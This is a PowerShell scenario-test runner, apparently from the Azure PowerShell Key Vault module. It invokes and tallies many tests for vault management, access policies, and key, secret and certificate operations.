
param(
    [Parameter(Mandatory=$true, Position=0)]
    [string] $TestRunNameSpace,
    [Parameter(Mandatory=$false, Position=1)]
    [ValidateSet('ControlPlane','DataPlane', 'All')]
    [string] $TestMode = 'All',
    [Parameter(Mandatory=$false, Position=2)]
    [string] $Location = 'eastus2',
    [Parameter(Mandatory=$false, Position=3)]
    [string] $Vault = "",
    [Parameter(Mandatory=$false, Position=4)]
    [string] $ResourceGroup = "",
    [Parameter(Mandatory=$false, Position=5)]
    [bool] $StandardVaultOnly = $false,
    [Parameter(Mandatory=$false, Position=6)]
    [bool] $SoftDeleteEnabled = $false,
    [Parameter(Mandatory=$false, Position=7)]
    [Guid] $UserObjectId,
    [Parameter(Mandatory=$false, Position=8)]
    [Nullable[bool]] $NoADCmdLetMode = $null,
    [Parameter(Mandatory=$false, Position=9)]
    [string] $StorageResourceId = $null
)

. (Join-Path $PSScriptRoot "..\..\..\..\Common\Commands.ScenarioTests.Common\Common.ps1")
. (Join-Path $PSScriptRoot "..\..\..\..\Common\Commands.ScenarioTests.Common\Assert.ps1")
. (Join-Path $PSScriptRoot "Common.ps1")
. (Join-Path $PSScriptRoot "VaultKeyTests.ps1")
. (Join-Path $PSScriptRoot "VaultSecretTests.ps1")
. (Join-Path $PSScriptRoot "VaultCertificateTests.ps1");
. (Join-Path $PSScriptRoot "VaultManagedStorageAccountTests.ps1");
. (Join-Path $PSScriptRoot "VaultManagementTests.ps1")
. (Join-Path $PSScriptRoot "ControlPlane\KeyVaultManagementTests.ps1")  
. (Join-Path $PSScriptRoot "ControlPlane\Common.ps1")

$global:totalCount = 0
$global:passedCount = 0
$global:passedTests = @()
$global:failedTests = @()
$global:times = @{}
$global:testEnv = 'PROD'
$global:testns = $TestRunNameSpace
$global:location = $Location
$global:testVault = $Vault
$global:resourceGroupName = $ResourceGroup
$global:standardVaultOnly = $StandardVaultOnly
$global:softDeleteEnabled = $SoftDeleteEnabled
$global:objectId = $UserObjectId
$global:noADCmdLetMode = $NoADCmdLetMode
$global:storageResourceId = $StorageResourceId

if (-not $global:objectId)
{
    $upn = (Get-AzContext).Account.Id
    $user = Get-AzADUser -UserPrincipalName $upn
    if ($user -eq $null)
    {
        $user = Get-AzADUser -Mail $upn
    }
    Assert-NotNull $user
    $global:objectId = $user.Id
}

if ($global:noADCmdLetMode -eq $null)
{
    
    if ((Get-AzContext).Environment.AzureKeyVaultDnsSuffix -eq 'vault.usgovcloudapi.net')
    {
        $global:noADCmdLetMode = $true
    }
    else
    {
        $global:noADCmdLetMode = $false
    }
}


function Run-TestProtected
{
    param(
        [ScriptBlock] $script,
        [string] $testName
    )

    $testStart = Get-Date
    try
    {
        Write-Host -ForegroundColor Green "====================================="
        Write-Host -ForegroundColor Green "Running test $testName"
        Write-Host -ForegroundColor Green "====================================="
        Write-Host
        &$script
        $global:passedCount = $global:passedCount + 1
        Write-Host
        Write-Host -ForegroundColor Green "====================================="
        Write-Host -ForegroundColor Green "Test Passed"
        Write-Host -ForegroundColor Green "====================================="
        Write-Host
        $global:passedTests += $testName
    }
    catch
    {
        Out-String -InputObject $_.Exception | Write-Host -ForegroundColor Red
        Write-Host
        Write-Host -ForegroundColor Red "====================================="
        Write-Host -ForegroundColor Red "Test Failed"
        Write-Host -ForegroundColor Red "====================================="
        Write-Host
        $global:failedTests += $testName
    }
    finally
    {
        $testEnd = Get-Date
        $testElapsed = $testEnd - $testStart
        $global:times[$testName] = $testElapsed
        $global:totalCount = $global:totalCount + 1
    }
}


function Run-AllControlPlaneTests
{
    Write-Host "Starting the control plane tests..."

    
    if ($global:standardVaultOnly -eq $false)
    {
        Run-TestProtected { Run-VaultTest { Test_CreateNewPremiumVaultEnabledForDeployment } "Test_CreateNewPremiumVaultEnabledForDeployment" } "Test_CreateNewPremiumVaultEnabledForDeployment"
    }

    Run-TestProtected { Run-VaultTest { Test_CreateNewVault } "Test_CreateNewVault" } "Test_CreateNewVault"
    Run-TestProtected { Run-VaultTest { Test_RecreateVaultFails } "Test_RecreateVaultFails" } "Test_RecreateVaultFails"
    Run-TestProtected { Run-VaultTest { Test_CreateVaultInUnknownResGrpFails } "Test_CreateVaultInUnknownResGrpFails" } "Test_CreateVaultInUnknownResGrpFails"
    Run-TestProtected { Run-VaultTest { Test_CreateVaultPositionalParams } "Test_CreateVaultPositionalParams" } "Test_CreateVaultPositionalParams"
    Run-TestProtected { Run-VaultTest { Test_CreateNewStandardVaultEnableSoftDelete } "Test_CreateNewStandardVaultEnableSoftDelete" } "Test_CreateNewStandardVaultEnableSoftDelete"

    
    Run-TestProtected { Run-VaultTest { Test_RecoverDeletedVault } "Test_RecoverDeletedVault" } "Test_RecoverDeletedVault"
    Run-TestProtected { Run-VaultTest { Test_GetNoneexistingDeletedVault } "Test_GetNoneexistingDeletedVault" } "Test_GetNoneexistingDeletedVault"
    Run-TestProtected { Run-VaultTest { Test_PurgeDeletedVault } "Test_PurgeDeletedVault" } "Test_PurgeDeletedVault"

    
    Run-TestProtected { Run-VaultTest { Test_GetVaultByNameAndResourceGroup } "Test_GetVaultByNameAndResourceGroup" } "Test_GetVaultByNameAndResourceGroup"
    Run-TestProtected { Run-VaultTest { Test_GetVaultByNameAndResourceGroupPositionalParams } "Test_GetVaultByNameAndResourceGroupPositionalParams" } "Test_GetVaultByNameAndResourceGroupPositionalParams"
    Run-TestProtected { Run-VaultTest { Test_GetVaultByName } "Test_GetVaultByName" } "Test_GetVaultByName"
    Run-TestProtected { Run-VaultTest { Test_GetUnknownVaultFails } "Test_GetUnknownVaultFails" } "Test_GetUnknownVaultFails"
    Run-TestProtected { Run-VaultTest { Test_GetVaultFromUnknownResourceGroupFails } "Test_GetVaultFromUnknownResourceGroupFails" } "Test_GetVaultFromUnknownResourceGroupFails"
    Run-TestProtected { Run-VaultTest { Test_ListVaultsByResourceGroup } "Test_ListVaultsByResourceGroup" } "Test_ListVaultsByResourceGroup"
    Run-TestProtected { Run-VaultTest { Test_ListAllVaultsInSubscription } "Test_ListAllVaultsInSubscription" } "Test_ListAllVaultsInSubscription"
    Run-TestProtected { Run-VaultTest { Test_ListVaultsByTag } "Test_ListVaultsByTag" } "Test_ListVaultsByTag"
    Run-TestProtected { Run-VaultTest { Test_ListVaultsByUnknownResourceGroupFails } "Test_ListVaultsByUnknownResourceGroupFails" } "Test_ListVaultsByUnknownResourceGroupFails"

    
    Run-TestProtected { Run-VaultTest { Test_DeleteVaultByName } "Test_DeleteVaultByName" } "Test_DeleteVaultByName"
    Run-TestProtected { Run-VaultTest { Test_DeleteUnknownVaultFails } "Test_DeleteUnknownVaultFails" } "Test_DeleteUnknownVaultFails"

    
    Run-TestProtected { Run-VaultTest { Test_SetRemoveAccessPolicyByUPN } "Test_SetRemoveAccessPolicyByUPN" } "Test_SetRemoveAccessPolicyByUPN"

    
    Run-TestProtected { Run-VaultTest { Test_SetRemoveAccessPolicyByEmailAddress } "Test_SetRemoveAccessPolicyByEmailAddress" } "Test_SetRemoveAccessPolicyByEmailAddress"

    Run-TestProtected { Run-VaultTest { Test_SetRemoveAccessPolicyBySPN } "Test_SetRemoveAccessPolicyBySPN" } "Test_SetRemoveAccessPolicyBySPN"
    Run-TestProtected { Run-VaultTest { Test_SetRemoveAccessPolicyByObjectId } "Test_SetRemoveAccessPolicyByObjectId" } "Test_SetRemoveAccessPolicyByObjectId"
    Run-TestProtected { Run-VaultTest { Test_SetRemoveAccessPolicyByBypassObjectIdValidation } "Test_SetRemoveAccessPolicyByBypassObjectIdValidation" } "Test_SetRemoveAccessPolicyByBypassObjectIdValidation"
    Run-TestProtected { Run-VaultTest { Test_SetRemoveAccessPolicyByCompoundId } "Test_SetRemoveAccessPolicyByCompoundId" } "Test_SetRemoveAccessPolicyByCompoundId"
    Run-TestProtected { Run-VaultTest { Test_RemoveAccessPolicyWithCompoundIdPolicies } "Test_RemoveAccessPolicyWithCompoundIdPolicies" } "Test_RemoveAccessPolicyWithCompoundIdPolicies"
    Run-TestProtected { Run-VaultTest { Test_SetCompoundIdAccessPolicy } "Test_SetCompoundIdAccessPolicy" } "Test_SetCompoundIdAccessPolicy"
    Run-TestProtected { Run-VaultTest { Test_ModifyAccessPolicy } "Test_ModifyAccessPolicy" } "Test_ModifyAccessPolicy"
    Run-TestProtected { Run-VaultTest { Test_ModifyAccessPolicyEnabledForDeployment } "Test_ModifyAccessPolicyEnabledForDeployment" } "Test_ModifyAccessPolicyEnabledForDeployment"
    Run-TestProtected { Run-VaultTest { Test_ModifyAccessPolicyNegativeCases } "Test_ModifyAccessPolicyNegativeCases" } "Test_ModifyAccessPolicyNegativeCases"
    Run-TestProtected { Run-VaultTest { Test_RemoveNonExistentAccessPolicyDoesNotThrow } "Test_RemoveNonExistentAccessPolicyDoesNotThrow" } "Test_RemoveNonExistentAccessPolicyDoesNotThrow"
    Run-TestProtected { Run-VaultTest { Test_AllPermissionExpansion } "Test_AllPermissionExpansion" } "Test_AllPermissionExpansion"


    
    Run-TestProtected { Run-VaultTest { Test_CreateDeleteVaultWithPiping } "Test_CreateDeleteVaultWithPiping" } "Test_CreateDeleteVaultWithPiping"
}


function Run-AllDataPlaneTests
{
    Write-Host "Starting the data plane tests..."

    
    if($global:softDeleteEnabled -eq $true)
    {
        
        Run-TestProtected { Run-KeyTest {Test_GetDeletedKey} "Test_GetDeletedKey" } "Test_GetDeletedKey"
        Run-TestProtected { Run-KeyTest {Test_GetDeletedKeys} "Test_GetDeletedKeys" } "Test_GetDeletedKeys"
        Run-TestProtected { Run-KeyTest {Test_UndoRemoveKey} "Test_UndoRemoveKey" } "Test_UndoRemoveKey"
        Run-TestProtected { Run-KeyTest {Test_RemoveDeletedKey} "Test_RemoveDeletedKey" } "Test_RemoveDeletedKey"
        Run-TestProtected { Run-KeyTest {Test_RemoveNonExistDeletedKey} "Test_RemoveNonExistDeletedKey" } "Test_RemoveNonExistDeletedKey"
        Run-TestProtected { Run-KeyTest {Test_PipelineRemoveDeletedKeys} "Test_PipelineRemoveDeletedKeys" } "Test_PipelineRemoveDeletedKeys"

        
        Run-TestProtected { Run-KeyTest {Test_GetDeletedKey} "Test_GetDeletedSecret" } "Test_GetDeletedSecret"
        Run-TestProtected { Run-KeyTest {Test_GetDeletedKeys} "Test_GetDeletedSecrets" } "Test_GetDeletedSecrets"
        Run-TestProtected { Run-KeyTest {Test_UndoRemoveSecret} "Test_UndoRemoveSecret" } "Test_UndoRemoveSecret"
        Run-TestProtected { Run-KeyTest {Test_RemoveDeletedSecret} "Test_RemoveDeletedSecret" } "Test_RemoveDeletedSecret"
        Run-TestProtected { Run-KeyTest {Test_RemoveNonExistDeletedSecret} "Test_RemoveNonExistDeletedSecret" } "Test_RemoveNonExistDeletedSecret"
        Run-TestProtected { Run-KeyTest {Test_PipelineRemoveDeletedSecrets} "Test_PipelineRemoveDeletedSecrets" } "Test_PipelineRemoveDeletedSecrets"

        
        Run-TestProtected { Run-KeyTest {Test_GetDeletedCertificate} "Test_GetDeletedCertificate" } "Test_GetDeletedCertificate"
        Run-TestProtected { Run-KeyTest {Test_GetDeletedCertificates} "Test_GetDeletedCertificates" } "Test_GetDeletedCertificates"
        Run-TestProtected { Run-KeyTest {Test_UndoRemoveCertificate} "Test_UndoRemoveCertificate" } "Test_UndoRemoveCertificate"
        Run-TestProtected { Run-KeyTest {Test_RemoveDeletedCertificate} "Test_RemoveDeletedCertificate" } "Test_RemoveDeletedCertificate"
        Run-TestProtected { Run-KeyTest {Test_RemoveNonExistDeletedCertificate} "Test_RemoveNonExistDeletedCertificate" } "Test_RemoveNonExistDeletedCertificate"
        Run-TestProtected { Run-KeyTest {Test_PipelineRemoveDeletedCertificates} "Test_PipelineRemoveDeletedCertificate" } "Test_PipelineRemoveDeletedCertificates"
    }

    
    Run-TestProtected { Run-KeyTest {Test_CreateSoftwareKeyWithDefaultAttributes} "Test_CreateSoftwareKeyWithDefaultAttributes" } "Test_CreateSoftwareKeyWithDefaultAttributes"
    Run-TestProtected { Run-KeyTest {Test_CreateSoftwareKeyWithCustomAttributes} "Test_CreateSoftwareKeyWithCustomAttributes" } "Test_CreateSoftwareKeyWithCustomAttributes"

    
    if (-not $global:standardVaultOnly)
    {
        Run-TestProtected { Run-KeyTest {Test_CreateHsmKeyWithDefaultAttributes} "Test_CreateHsmKeyWithDefaultAttributes" } "Test_CreateHsmKeyWithDefaultAttributes"
        Run-TestProtected { Run-KeyTest {Test_CreateHsmKeyWithCustomAttributes} "Test_CreateHsmKeyWithCustomAttributes" } "Test_CreateHsmKeyWithCustomAttributes"
        Run-TestProtected { Run-KeyTest {Test_ImportPfxAsHsmWithDefaultAttributes} "Test_ImportPfxAsHsmWithDefaultAttributes" } "Test_ImportPfxAsHsmWithDefaultAttributes"
        Run-TestProtected { Run-KeyTest {Test_ImportPfxAsHsmWithCustomAttributes} "Test_ImportPfxAsHsmWithCustomAttributes" } "Test_ImportPfxAsHsmWithCustomAttributes"

        
        
        
        
        
        $byokSubscriptionId = "c2619f08-57f7-492b-a9c3-45dee233805b"
        if ((Get-AzContext).Subscription.SubscriptionId -eq "c2619f08-57f7-492b-a9c3-45dee233805b")
        {
            Run-TestProtected { Run-KeyTest {Test_ImportByokWithDefaultAttributes} "Test_ImportByokWithDefaultAttributes" } "Test_ImportByokWithDefaultAttributes"
            Run-TestProtected { Run-KeyTest {Test_ImportByokWith1024BitKey} "Test_ImportByokWith1024BitKey" } "Test_ImportByokWith1024BitKey"
            Run-TestProtected { Run-KeyTest {Test_ImportByokWithCustomAttributes} "Test_ImportByokWithCustomAttributes" } "Test_ImportByokWithCustomAttributes"
        }
    }

    Run-TestProtected { Run-KeyTest {Test_ImportPfxWithDefaultAttributes} "Test_ImportPfxWithDefaultAttributes" } "Test_ImportPfxWithDefaultAttributes"
    Run-TestProtected { Run-KeyTest {Test_ImportPfxWith1024BitKey} "Test_ImportPfxWith1024BitKey" } "Test_ImportPfxWith1024BitKey"
    Run-TestProtected { Run-KeyTest {Test_ImportPfxWithCustomAttributes} "Test_ImportPfxWithCustomAttributes" } "Test_ImportPfxWithCustomAttributes"
    Run-TestProtected { Run-KeyTest {Test_AddKeyPositionalParameter} "Test_AddKeyPositionalParameter" } "Test_AddKeyPositionalParameter"
    Run-TestProtected { Run-KeyTest {Test_AddKeyAliasParameter} "Test_AddKeyAliasParameter" } "Test_AddKeyAliasParameter"
    Run-TestProtected { Run-KeyTest {Test_ImportNonExistPfxFile} "Test_ImportNonExistPfxFile" } "Test_ImportNonExistPfxFile"
    Run-TestProtected { Run-KeyTest {Test_ImportPfxFileWithIncorrectPassword} "Test_ImportPfxFileWithIncorrectPassword" } "Test_ImportPfxFileWithIncorrectPassword"
    Run-TestProtected { Run-KeyTest {Test_ImportNonExistByokFile} "Test_ImportNonExistByokFile" } "Test_ImportNonExistByokFile"
    Run-TestProtected { Run-KeyTest {Test_CreateKeyInNonExistVault} "Test_CreateKeyInNonExistVault" } "Test_CreateKeyInNonExistVault"
    Run-TestProtected { Run-KeyTest {Test_ImportByokAsSoftwareKey} "Test_ImportByokAsSoftwareKey" } "Test_ImportByokAsSoftwareKey"
    Run-TestProtected { Run-KeyTest {Test_CreateKeyInNoPermissionVault} "Test_CreateKeyInNoPermissionVault" } "Test_CreateKeyInNoPermissionVault"

    
    Run-TestProtected { Run-KeyTest {Test_UpdateIndividualKeyAttributes} "Test_UpdateIndividualKeyAttributes" } "Test_UpdateIndividualKeyAttributes"
    Run-TestProtected { Run-KeyTest {Test_UpdateAllEditableKeyAttributes} "Test_UpdateAllEditableKeyAttributes" } "Test_UpdateAllEditableKeyAttributes"
    Run-TestProtected { Run-KeyTest {Test_UpdateKeyWithNoChange} "Test_UpdateKeyWithNoChange" } "Test_UpdateKeyWithNoChange"
    Run-TestProtected { Run-KeyTest {Test_SetKeyPositionalParameter} "Test_SetKeyPositionalParameter" } "Test_SetKeyPositionalParameter"
    Run-TestProtected { Run-KeyTest {Test_SetKeyAliasParameter} "Test_SetKeyAliasParameter" } "Test_SetKeyAliasParameter"
    Run-TestProtected { Run-KeyTest {Test_SetKeyVersion} "Test_SetKeyVersion" } "Test_SetKeyVersion"
    Run-TestProtected { Run-KeyTest {Test_SetKeyInNonExistVault} "Test_SetKeyInNonExistVault" } "Test_SetKeyInNonExistVault"
    Run-TestProtected { Run-KeyTest {Test_SetNonExistKey} "Test_SetNonExistKey" } "Test_SetNonExistKey"
    Run-TestProtected { Run-KeyTest {Test_SetInvalidKeyAttributes} "Test_SetInvalidKeyAttributes" } "Test_SetInvalidKeyAttributes"
    Run-TestProtected { Run-KeyTest {Test_SetKeyInNoPermissionVault} "Test_SetKeyInNoPermissionVault" } "Test_SetKeyInNoPermissionVault"

    
    Run-TestProtected { Run-KeyTest {Test_GetOneKey} "Test_GetOneKey" } "Test_GetOneKey"
    Run-TestProtected { Run-KeyTest {Test_GetPreviousVersionOfKey} "Test_GetPreviousVersionOfKey" } "Test_GetPreviousVersionOfKey"
    Run-TestProtected { Run-KeyTest {Test_GetKeyPositionalParameter} "Test_GetKeyPositionalParameter" } "Test_GetKeyPositionalParameter"
    Run-TestProtected { Run-KeyTest {Test_GetKeyAliasParameter} "Test_GetKeyAliasParameter" } "Test_GetKeyAliasParameter"
    Run-TestProtected { Run-KeyTest {Test_GetKeysInNonExistVault} "Test_GetKeysInNonExistVault" } "Test_GetKeysInNonExistVault"
    Run-TestProtected { Run-KeyTest {Test_GetNonExistKey} "Test_GetNonExistKey" } "Test_GetNonExistKey"
    Run-TestProtected { Run-KeyTest {Test_GetKeyInNoPermissionVault} "Test_GetKeyInNoPermissionVault" } "Test_GetKeyInNoPermissionVault"
    Run-TestProtected { Run-KeyTest {Test_GetAllKeys} "Test_GetAllKeys" } "Test_GetAllKeys"
    Run-TestProtected { Run-KeyTest {Test_GetKeyVersions} "Test_GetKeyVersions" } "Test_GetKeyVersions"

    
    Run-TestProtected { Run-KeyTest {Test_RemoveKeyWithoutPrompt} "Test_RemoveKeyWithoutPrompt" } "Test_RemoveKeyWithoutPrompt"
    Run-TestProtected { Run-KeyTest {Test_RemoveKeyWhatIf} "Test_RemoveKeyWhatIf" } "Test_RemoveKeyWhatIf"
    Run-TestProtected { Run-KeyTest {Test_RemoveKeyPositionalParameter} "Test_RemoveKeyPositionalParameter" } "Test_RemoveKeyPositionalParameter"
    Run-TestProtected { Run-KeyTest {Test_RemoveKeyAliasParameter} "Test_RemoveKeyAliasParameter" } "Test_RemoveKeyAliasParameter"
    Run-TestProtected { Run-KeyTest {Test_RemoveKeyInNonExistVault} "Test_RemoveKeyInNonExistVault" } "Test_RemoveKeyInNonExistVault"
    Run-TestProtected { Run-KeyTest {Test_RemoveNonExistKey} "Test_RemoveNonExistKey" } "Test_RemoveNonExistKey"
    Run-TestProtected { Run-KeyTest {Test_RemoveKeyInNoPermissionVault} "Test_RemoveKeyInNoPermissionVault" } "Test_RemoveKeyInNoPermissionVault"

    
    Run-TestProtected { Run-KeyTest {Test_BackupRestoreKeyByName} "Test_BackupRestoreKeyByName" } "Test_BackupRestoreKeyByName"
    Run-TestProtected { Run-KeyTest {Test_BackupRestoreKeyByRef} "Test_BackupRestoreKeyByRef" } "Test_BackupRestoreKeyByRef"
    Run-TestProtected { Run-KeyTest {Test_BackupNonExistingKey} "Test_BackupNonExistingKey" } "Test_BackupNonExistingKey"
    Run-TestProtected { Run-KeyTest {Test_BackupKeyToANamedFile} "Test_BackupKeyToANamedFile" } "Test_BackupKeyToANamedFile"
    Run-TestProtected { Run-KeyTest {Test_BackupKeyToExistingFile} "Test_BackupKeyToExistingFile" } "Test_BackupKeyToExistingFile"
    Run-TestProtected { Run-KeyTest {Test_RestoreKeyFromNonExistingFile} "Test_RestoreKeyFromNonExistingFile" } "Test_RestoreKeyFromNonExistingFile"

    
    Run-TestProtected { Run-KeyTest {Test_PipelineUpdateKeys} "Test_PipelineUpdateKeys" } "Test_PipelineUpdateKeys"
    Run-TestProtected { Run-KeyTest {Test_PipelineRemoveKeys} "Test_PipelineRemoveKeys" } "Test_PipelineRemoveKeys"
    Run-TestProtected { Run-KeyTest {Test_PipelineUpdateKeyVersions} "Test_PipelineUpdateKeyVersions" } "Test_PipelineUpdateKeyVersions"

    
    Run-TestProtected { Run-SecretTest {Test_CreateSecret} "Test_CreateSecret" } "Test_CreateSecret"
    Run-TestProtected { Run-SecretTest {Test_CreateSecretWithCustomAttributes} "Test_CreateSecretWithCustomAttributes" } "Test_CreateSecretWithCustomAttributes"
    Run-TestProtected { Run-SecretTest {Test_UpdateSecret} "Test_UpdateSecret" } "Test_UpdateSecret"

    Run-TestProtected { Run-SecretTest {Test_SetSecretPositionalParameter} "Test_SetSecretPositionalParameter" } "Test_SetSecretPositionalParameter"
    Run-TestProtected { Run-SecretTest {Test_SetSecretAliasParameter} "Test_SetSecretAliasParameter" } "Test_SetSecretAliasParameter"
    Run-TestProtected { Run-SecretTest {Test_SetSecretInNonExistVault} "Test_SetSecretInNonExistVault" } "Test_SetSecretInNonExistVault"
    Run-TestProtected { Run-SecretTest {Test_SetSecretInNoPermissionVault} "Test_SetSecretInNoPermissionVault" } "Test_SetSecretInNoPermissionVault"

    
    Run-TestProtected { Run-SecretTest {Test_UpdateIndividualSecretAttributes} "Test_UpdateIndividualSecretAttributes" } "Test_UpdateIndividualSecretAttributes"
    Run-TestProtected { Run-SecretTest {Test_UpdateSecretWithNoChange} "Test_UpdateSecretWithNoChange" } "Test_UpdateSecretWithNoChange"
    Run-TestProtected { Run-SecretTest {Test_UpdateAllEditableSecretAttributes} "Test_UpdateAllEditableSecretAttributes" } "Test_UpdateAllEditableSecretAttributes"
    Run-TestProtected { Run-SecretTest {Test_SetSecretAttributePositionalParameter} "Test_SetSecretAttributePositionalParameter" } "Test_SetSecretAttributePositionalParameter"
    Run-TestProtected { Run-SecretTest {Test_SetSecretAttributeAliasParameter} "Test_SetSecretAttributeAliasParameter" } "Test_SetSecretAttributeAliasParameter"
    Run-TestProtected { Run-SecretTest {Test_SetSecretVersion} "Test_SetSecretVersion" } "Test_SetSecretVersion"
    Run-TestProtected { Run-SecretTest {Test_SetSecretInNonExistVault} "Test_SetSecretInNonExistVault" } "Test_SetSecretInNonExistVault"
    Run-TestProtected { Run-SecretTest {Test_SetNonExistSecret} "Test_SetNonExistSecret" } "Test_SetNonExistSecret"
    Run-TestProtected { Run-SecretTest {Test_SetInvalidSecretAttributes} "Test_SetInvalidSecretAttributes" } "Test_SetInvalidSecretAttributes"
    Run-TestProtected { Run-SecretTest {Test_SetSecretAttrInNoPermissionVault} "Test_SetSecretAttrInNoPermissionVault" } "Test_SetSecretAttrInNoPermissionVault"

    
    Run-TestProtected { Run-SecretTest {Test_GetOneSecret} "Test_GetOneSecret" } "Test_GetOneSecret"
    Run-TestProtected { Run-SecretTest {Test_GetAllSecrets} "Test_GetAllSecrets" } "Test_GetAllSecrets"
    Run-TestProtected { Run-SecretTest {Test_GetPreviousVersionOfSecret} "Test_GetPreviousVersionOfSecret" } "Test_GetPreviousVersionOfSecret"
    Run-TestProtected { Run-SecretTest {Test_GetSecretVersions} "Test_GetSecretVersions" } "Test_GetSecretVersions"
    Run-TestProtected { Run-SecretTest {Test_GetSecretPositionalParameter} "Test_GetSecretPositionalParameter" } "Test_GetSecretPositionalParameter"
    Run-TestProtected { Run-SecretTest {Test_GetSecretAliasParameter} "Test_GetSecretAliasParameter" } "Test_GetSecretAliasParameter"
    Run-TestProtected { Run-SecretTest {Test_GetSecretInNonExistVault} "Test_GetSecretInNonExistVault" } "Test_GetSecretInNonExistVault"
    Run-TestProtected { Run-SecretTest {Test_GetNonExistSecret} "Test_GetNonExistSecret" } "Test_GetNonExistSecret"
    Run-TestProtected { Run-SecretTest {Test_GetSecretInNoPermissionVault} "Test_GetSecretInNoPermissionVault" } "Test_GetSecretInNoPermissionVault"

    
    Run-TestProtected { Run-SecretTest {Test_RemoveSecretWithoutPrompt} "Test_RemoveSecretWithoutPrompt" } "Test_RemoveSecretWithoutPrompt"
    Run-TestProtected { Run-SecretTest {Test_RemoveSecretWhatIf} "Test_RemoveSecretWhatIf" } "Test_RemoveSecretWhatIf"
    Run-TestProtected { Run-SecretTest {Test_RemoveSecretPositionalParameter} "Test_RemoveSecretPositionalParameter" } "Test_RemoveSecretPositionalParameter"
    Run-TestProtected { Run-SecretTest {Test_RemoveSecretAliasParameter} "Test_RemoveSecretAliasParameter" } "Test_RemoveSecretAliasParameter"
    Run-TestProtected { Run-SecretTest {Test_RemoveSecretInNonExistVault} "Test_RemoveSecretInNonExistVault" } "Test_RemoveSecretInNonExistVault"
    Run-TestProtected { Run-SecretTest {Test_RemoveNonExistSecret} "Test_RemoveNonExistSecret" } "Test_RemoveNonExistSecret"
    Run-TestProtected { Run-SecretTest {Test_RemoveSecretInNoPermissionVault} "Test_RemoveSecretInNoPermissionVault" } "Test_RemoveSecretInNoPermissionVault"

    
    Run-TestProtected { Run-SecretTest {Test_BackupRestoreSecretByName} "Test_BackupRestoreSecretByName" } "Test_BackupRestoreSecretByName"
    Run-TestProtected { Run-SecretTest {Test_BackupRestoreSecretByRef} "Test_BackupRestoreSecretByRef" } "Test_BackupRestoreSecretByRef"
    Run-TestProtected { Run-SecretTest {Test_BackupNonExistingSecret} "Test_BackupNonExistingSecret" } "Test_BackupNonExistingSecret"
    Run-TestProtected { Run-SecretTest {Test_BackupSecretToANamedFile} "Test_BackupSecretToANamedFile" } "Test_BackupSecretToANamedFile"
    Run-TestProtected { Run-SecretTest {Test_BackupSecretToExistingFile} "Test_BackupSecretToExistingFile" } "Test_BackupSecretToExistingFile"
    Run-TestProtected { Run-SecretTest {Test_RestoreSecretFromNonExistingFile} "Test_RestoreSecretFromNonExistingFile" } "Test_RestoreSecretFromNonExistingFile"

    
    Run-TestProtected { Run-SecretTest {Test_PipelineUpdateSecrets} "Test_PipelineUpdateSecrets" } "Test_PipelineUpdateSecrets"
    Run-TestProtected { Run-SecretTest {Test_PipelineUpdateSecretAttributes} "Test_PipelineUpdateSecretAttributes" } "Test_PipelineUpdateSecretAttributes"
    Run-TestProtected { Run-SecretTest {Test_PipelineUpdateSecretVersions} "Test_PipelineUpdateSecretVersions" } "Test_PipelineUpdateSecretVersions"
    Run-TestProtected { Run-SecretTest {Test_PipelineRemoveSecrets} "Test_PipelineRemoveSecrets" } "Test_PipelineRemoveSecrets"

    
    Run-TestProtected { Run-CertificateTest {Test_ImportPfxAsCertificate} "Test_ImportPfxAsCertificate" } "Test_ImportPfxAsCertificate"
    Run-TestProtected { Run-CertificateTest {Test_ImportPfxAsCertificateNonSecurePassword} "Test_ImportPfxAsCertificateNonSecurePassword" } "Test_ImportPfxAsCertificateNonSecurePassword"
    Run-TestProtected { Run-CertificateTest {Test_ImportPfxAsCertificateWithoutPassword} "Test_ImportPfxAsCertificateWithoutPassword" } "Test_ImportPfxAsCertificateWithoutPassword"
    Run-TestProtected { Run-CertificateTest {Test_ImportX509Certificate2CollectionAsCertificate} "Test_ImportX509Certificate2CollectionAsCertificate" } "Test_ImportX509Certificate2CollectionAsCertificate"
    Run-TestProtected { Run-CertificateTest {Test_ImportX509Certificate2CollectionNotExportableAsCertificate} "Test_ImportX509Certificate2CollectionNotExportableAsCertificate" } "Test_ImportX509Certificate2CollectionNotExportableAsCertificate"
    Run-TestProtected { Run-CertificateTest {Test_ImportBase64EncodedStringAsCertificate} "Test_ImportBase64EncodedStringAsCertificate" } "Test_ImportBase64EncodedStringAsCertificate"
    Run-TestProtected { Run-CertificateTest {Test_ImportBase64EncodedStringWithoutPasswordAsCertificate} "Test_ImportBase64EncodedStringWithoutPasswordAsCertificate" } "Test_ImportBase64EncodedStringWithoutPasswordAsCertificate"

    
    Run-TestProtected { Run-CertificateTest {Test_MergeCerWithNonExistantKeyPair} "Test_MergeCerWithNonExistantKeyPair" } "Test_MergeCerWithNonExistantKeyPair"
    Run-TestProtected { Run-CertificateTest {Test_MergeCerWithMismatchKeyPair} "Test_MergeCerWithMismatchKeyPair" } "Test_MergeCerWithMismatchKeyPair"

    
    Run-TestProtected { Run-CertificateTest {Test_GetCertificate} "Test_GetCertificate" } "Test_GetCertificate"
    Run-TestProtected { Run-CertificateTest {Test_GetCertificateNonExistant} "Test_GetCertificateNonExistant" } "Test_GetCertificateNonExistant"
    Run-TestProtected { Run-CertificateTest {Test_ListCertificates} "Test_ListCertificates" } "Test_ListCertificates"

    
    Run-TestProtected { Run-CertificateTest {Test_AddAndGetCertificateContacts} "Test_AddAndGetCertificateContacts" } "Test_AddAndGetCertificateContacts"

    
    Run-TestProtected { Run-CertificateTest {Test_GetNonExistingCertificatePolicy} "Test_GetNonExistingCertificatePolicy" } "Test_GetNonExistingCertificatePolicy"
    Run-TestProtected { Run-CertificateTest {Test_NewCertificatePolicy} "Test_NewCertificatePolicy" } "Test_NewCertificatePolicy"
    Run-TestProtected { Run-CertificateTest {Test_SetCertificatePolicy} "Test_SetCertificatePolicy" } "Test_SetCertificatePolicy"

    
    Run-TestProtected { Run-CertificateTest {Test_NewOrganizationDetails} "Test_NewOrganizationDetails" } "Test_NewOrganizationDetails"

    
    Run-TestProtected { Run-CertificateTest {Test_CreateAndGetTestIssuer} "Test_CreateAndGetTestIssuer" } "Test_CreateAndGetTestIssuer"

    
    Run-TestProtected { Run-CertificateTest {Test_Add_AzureKeyVaultCertificate} "Test_Add_AzureKeyVaultCertificate" } "Test_Add_AzureKeyVaultCertificate"
    Run-TestProtected { Run-CertificateTest {Test_CertificateTags} "Test_CertificateTags" } "Test_CertificateTags"
    Run-TestProtected { Run-CertificateTest {Test_UpdateCertificateTags} "Test_UpdateCertificateTags" } "Test_UpdateCertificateTags"

   
